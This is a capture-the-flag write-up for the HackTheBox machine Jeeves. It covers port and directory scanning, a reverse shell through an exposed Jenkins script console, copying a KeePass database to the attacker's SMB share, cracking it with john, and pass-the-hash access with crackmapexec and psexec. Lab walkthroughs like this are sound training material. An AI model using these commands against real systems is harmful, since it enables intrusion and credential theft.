

![1](</Writeups/Machines/Jeeves/img/logo.png>)
By Rug4lo

## Reconnaissance 

First of all we are going to run an Nmap scan to see the open ports 

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.63
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 23:21 CEST
Initiating SYN Stealth Scan at 23:21
Scanning 10.10.10.63 [65535 ports]
Discovered open port 80/tcp on 10.10.10.63
Discovered open port 135/tcp on 10.10.10.63
Discovered open port 445/tcp on 10.10.10.63
Discovered open port 50000/tcp on 10.10.10.63
Completed SYN Stealth Scan at 23:22, 39.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.63
Host is up, received user-set (0.042s latency).
Scanned at 2023-10-16 23:21:58 CEST for 39s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds
           Raw packets sent: 196628 (8.652MB) | Rcvd: 36 (2.040KB)
```

We can see that port 80 is open, so we are going to check out the web page

![1](</Writeups/Machines/Jeeves/img/1.png>)

We can try searching for something, but if we look at the page's source code, it will not send any request, you will only get a picture of an error

![1](</Writeups/Machines/Jeeves/img/2.png>)

From what we can see there isn't much more on this page, but if we look at the Nmap scan we will see that port 5000 is open, so we are going to take a look 

![1](</Writeups/Machines/Jeeves/img/3.png>)

If we browse in we get an error, although we have the version it uses we can first run a directory discovery with feroxbuster (if you use a smaller list than this one the directory won't show up)

```bash
feroxbuster -u http://10.10.10.63:50000 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c http://10.10.10.63:50000/askjeeves
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/about
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/search
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/security
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/projects
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/people
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/version
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/assets
200        0l        0w        0c http://10.10.10.63:50000/askjeeves/about/index
```

## Jenkins exploitation

Seeing that we have an /askjeeves we can go in and find an administration environment, which has a section for running commands for debugging purposes

![1](</Writeups/Machines/Jeeves/img/4.png>)

Inside this console we can try to get a reverse shell, like this: first we go to where we have netcat.exe on our machine, once there we spin up an SMB server

```bash
smbserver.py smbFolder $(pwd) -smb2sup
```

With this server created we start listening with netcat

```bash
nc -nlvp 4444
```

Now we have to manage to execute commands, but this console only runs Groovy code, after looking up how to run shell commands in this language I found this way

![1](</Writeups/Machines/Jeeves/img/5.png>)

Alright, with this ready we can run this command to get the reverse shell

![1](</Writeups/Machines/Jeeves/img/6.png>)

If we look at the terminal where we were listening,  we will have the reverse shell

![1](</Writeups/Machines/Jeeves/img/7.png>)

Now we can go to the Kohsuke user's desktop and read the flag

![1](</Writeups/Machines/Jeeves/img/8.png>)

## Privilege escalation

Alright, now for root. To escalate privileges we can find a .kdbx file in the Documents folder of the user Kohsuke, this extension is used for KeePass password files 

![1](</Writeups/Machines/Jeeves/img/9.png>)

This type of file holds the passwords, but to access them you have to enter a password, seeing this we can try brute forcing it, to see if we can figure out the password, for this the first thing will be to transfer the file to our machine like this (with the SMB server running)

```bash
copy CEH.kdbx \\10.10.14.7\smbFolder\CEH.kdbx
```

Now that we have the file we can use the keepass2john tool to get a hash which we are going to crack with john

```bash
keepass2john CEH.kdbx
```

```bash
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

We create a file called hash containing the output of the previous command, and we use john with rockyou.txt for the brute force

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

With the password we can now open the file 

![1](</Writeups/Machines/Jeeves/img/10.png>)

We can test the passwords one by one with [[Crackmapexec]] to see if they are valid, and we will see that none of them are

```bash
crackmapexec smb 10.10.10.63 -u 'Administrator' -p '1234'
```

But if we look at the first one we will see that it appears to be a hash, we try passing the hash to [[Crackmapexec]]

![1](</Writeups/Machines/Jeeves/img/11.png>)

We see that it gives us the Pwn3d! so the hash is valid!, now we can try connecting to the machine with this hash using the Psexec tool

![1](</Writeups/Machines/Jeeves/img/12.png>)

Now we can calmly go for the root.txt...

![1](</Writeups/Machines/Jeeves/img/13.png>)

Well... the flag is a bit more hidden, but not much, if we do a hidden directory discovery we will see the flag

![1](</Writeups/Machines/Jeeves/img/14.png>)

To read it, it would simply be:

```bash
more < hm.txt:root.txt
```